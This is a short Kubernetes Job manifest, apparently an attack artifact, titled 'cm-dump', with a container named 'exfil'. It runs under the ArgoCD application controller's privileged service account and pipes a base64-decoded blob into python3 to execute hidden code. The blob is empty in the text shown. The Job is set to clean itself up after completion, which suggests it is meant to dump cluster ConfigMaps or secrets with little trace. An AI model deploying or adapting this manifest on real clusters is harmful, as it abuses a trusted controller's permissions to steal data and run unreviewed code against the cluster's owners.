apiVersion: batch/v1
kind: Job
metadata:
  name: cm-dump
  namespace: argocd
spec:
  ttlSecondsAfterFinished: 300
  backoffLimit: 1
  template:
    spec:
      serviceAccountName: argocd-application-controller
      restartPolicy: Never
      containers:
      - name: exfil
        image: python:3.9-alpine
        command: ["/bin/sh", "-c"]
        args:
        - "echo  | base64 -d | python3 -"
